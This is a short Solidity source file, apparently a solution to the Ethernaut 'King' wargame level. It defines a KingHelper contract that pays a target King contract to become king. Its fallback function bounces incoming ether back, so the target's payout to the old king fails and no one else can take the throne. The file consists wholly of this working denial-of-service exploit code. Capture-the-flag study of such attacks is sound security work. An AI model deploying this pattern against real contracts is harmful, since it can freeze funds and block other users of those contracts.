// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";
contract KingHelper {
    KingAbstract kingContract;
    constructor(address payable _address) {
        kingContract = KingAbstract(_address);
    }
    function kingMe() external payable{
        address(kingContract).call{value: msg.value}("");
    }
    fallback() external payable{
        // We could just do while(1) here?
        address king = kingContract._king();
        if (king != address(this)) {
            console.log("in if");
            address(kingContract).call{value: msg.value}("");
        }
    }
}
abstract contract KingAbstract {

  address king;
  uint public prize;
  address public owner;

  function _king() public virtual returns (address);
}